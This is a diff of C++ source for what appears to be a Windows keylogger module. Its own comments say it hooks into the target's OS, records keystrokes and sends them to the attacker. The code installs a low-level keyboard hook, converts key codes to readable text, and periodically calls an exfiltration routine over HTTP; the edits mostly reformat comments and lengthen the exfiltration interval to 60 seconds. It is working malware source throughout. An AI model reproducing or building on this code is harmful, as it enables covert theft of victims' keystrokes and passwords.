@@ -8,6 +8,13 @@
 #include "Timer.h"
 #include "Exfiltrate.h"
 
+/*
+
+This header file will include the functionality used to actually hook into the target's OS,
+record keystrokes, convert them into human readable names, and send them out to the attacker
+
+*/
+
 namespace APIHook
 {
 
@@ -22,9 +29,11 @@ namespace APIHook
 			workingKeyLog += "There were no keystrokes during this period of logging!";
 		}
 		
-		//Temp removing the log file capability in favor of on demand exfil through http bc of opsec concerns
+		// Temp removing the log file capability in favor of on demand exfil through http bc of opsec concerns
 
-		/*std::string newLogFilePath = IO::writeToLog(workingKeyLog);
+		/*
+		
+		std::string newLogFilePath = IO::writeToLog(workingKeyLog);
 		Auxiliary::logError("APIHook::preExfilProcedure() - workingKeyLog has been pushed to key log file!");
 		
 		if (newLogFilePath.empty())
@@ -34,7 +43,9 @@ namespace APIHook
 		else
 		{
 			Auxiliary::logError("APIHook::preExfilProcedure() - IO::writeToLog() has generated a new key log file!");
-		}*/
+		}
+		
+		*/
 
 		if (Exfiltrate::exfilLogs(workingKeyLog))
 		{
@@ -47,11 +58,13 @@ namespace APIHook
 		}
 	}
 
-	//Change exfiltration interval here...remember...time is in miliseconds!
+	// Change exfiltration interval here...remember...time is in miliseconds!
 
-	Timer logExfilTimer(preExfilProcedure, 1000 * 3, Timer::Infinite);
+	Timer logExfilTimer(preExfilProcedure, 1000 * 60, Timer::Infinite);
 
-	/* The hookingProcedure() function is used with the SetWindowsHookEx() function. 
+	/* 
+	
+	The hookingProcedure() function is used with the SetWindowsHookEx() function. 
 	The system calls this function every time a new keyboard input event is about 
 	to be posted into a thread input queue. 
 	
@@ -67,7 +80,9 @@ namespace APIHook
 	and may behave incorrectly as a result. 
 	
 	If the hook procedure processed the message, it may return a nonzero value to prevent the system
-	from passing the message to the rest of the hook chain or the target window procedure. */
+	from passing the message to the rest of the hook chain or the target window procedure. 
+	
+	*/
 
 	LRESULT hookingProcedure(int nCode, WPARAM wParam, LPARAM lParam)
 	{
@@ -76,22 +91,26 @@ namespace APIHook
 			CallNextHookEx(keyboardHook, nCode, wParam, lParam);
 		}
 
-		//Below is the lParam structure passed in being assigned to a local method struct ptr for easier use
+		// Below is the lParam structure passed in being assigned to a local method struct ptr for easier use
 
 		KBDLLHOOKSTRUCT* keyPress = (KBDLLHOOKSTRUCT*)lParam;
 		
 		/*	
-			wParam ID values:
+		
+		wParam ID values:
 
-			WM_KEYDOWN is when a regular key is pressed (i.e caps lock, a, b, c)
-			WM_SYSKEYDOWN is when combination keys or system buttons are pressed (i.e alt+tab, alt+insert) 
-			WM_KEYUP is when a regular key is released
-			WM_SYSKEYUP is when a system key is released
+		WM_KEYDOWN is when a regular key is pressed (i.e caps lock, a, b, c)
+		WM_SYSKEYDOWN is when combination keys or system buttons are pressed (i.e alt+tab, alt+insert) 
+		WM_KEYUP is when a regular key is released
+		WM_SYSKEYUP is when a system key is released
+		
 		*/
 
 		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
 		{
-			/*if (keyPress->vkCode == VK_RETURN)
+			/*
+			
+			if (keyPress->vkCode == VK_RETURN)
 			{
 				//Handle enter key in the log for formatting purposes
 
@@ -100,7 +119,9 @@ namespace APIHook
 			else
 			{
 				workingKeyLog += KeyMap::KeyLookupEN[keyPress->vkCode].humanReadableName;
-			}*/
+			}
+			
+			*/
 
 			workingKeyLog += KeyMap::KeyLookupEN[keyPress->vkCode].humanReadableName;
 
@@ -109,7 +130,7 @@ namespace APIHook
 		{
 			int keyCode = keyPress->vkCode;
 
-			//If any of the following specific system keys are released...
+			// If any of the following specific system keys are released...
 
 			if (
 				keyCode == VK_CONTROL ||
@@ -121,13 +142,15 @@ namespace APIHook
 				keyCode == VK_MENU ||
 				keyCode == VK_LMENU ||
 				keyCode == VK_RMENU
+				
 				//keyCode == VK_CAPITAL ||
 				//keyCode == VK_NUMLOCK ||
 				//keyCode == VK_LWIN ||
 				//keyCode == VK_RWIN
+				
 				)
 			{
-				//Indicate so in the log [/SHIFT], otherwise we don't care about a, b, or c being released
+				// Indicate so in the log [/SHIFT], otherwise we don't care about a, b, or c being released
 
 				std::string keyName = KeyMap::KeyLookupEN[keyPress->vkCode].humanReadableName;
 				keyName.insert(2, "/");
@@ -138,15 +161,19 @@ namespace APIHook
 		return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
 	}
 
-	//This function will be used to hook into the keyboard.
+	// This function will be used to hook into the keyboard.
 
 	void installHook()
 	{
-		/* Here, we are hooking into the internal Windows message-transport system using the
+		/* 
+		
+		Here, we are hooking into the internal Windows message-transport system using the
 		SetWindowsHookEx() function. We pass in the hook code 13, which is a low-level keyboard hook.
 		Then we pass in a pointer (HOOKPROC) to the hooking procedure function and a garbage handle
 		to a null object. Finally, we pass in the id of the thread with which the hook procedure 
-		is to be associated (basically all existing threads if 0). */
+		is to be associated (basically all existing threads if 0). 
+		
+		*/
 
 		keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)hookingProcedure, GetModuleHandle(NULL), 0);
 
@@ -161,22 +188,22 @@ namespace APIHook
 		}
 	}
 
-	//This function will be used to remove our keyboard hook
+	// This function will be used to remove our keyboard hook
 
 	void uninstallHook()
 	{
-		//Here we pass an HHOOK to UnhookWindowsHookEx() in order to have it removed
+		// Here we pass an HHOOK to UnhookWindowsHookEx() in order to have it removed
 
 		UnhookWindowsHookEx(keyboardHook);
 
 		Auxiliary::logError("API::uninstallHook() - Windows keyboard hook uninstalled!");
 		
-		//Restore the HHOOK to NULL so the isHooked() function works
+		// Restore the HHOOK to NULL so the isHooked() function works
 		
 		keyboardHook = NULL;
 	}
 
-	//Status checking for the keyboard hook
+	// Status checking for the keyboard hook
 
 	bool isHooked()
 	{
